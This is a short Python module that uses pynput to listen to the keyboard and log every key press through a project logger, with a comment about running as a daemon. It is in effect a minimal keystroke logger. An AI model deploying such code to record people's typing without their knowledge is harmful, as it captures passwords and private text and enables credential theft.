from pynput.keyboard import Listener, Key
from .constants import logger


def _on_press(key: Key):
    logger.info(f"{key} pressed.")


def entry():
    # Become a daemon process
    logger.info("beginning...")
    with Listener(on_press=_on_press) as listener:
        listener.join()
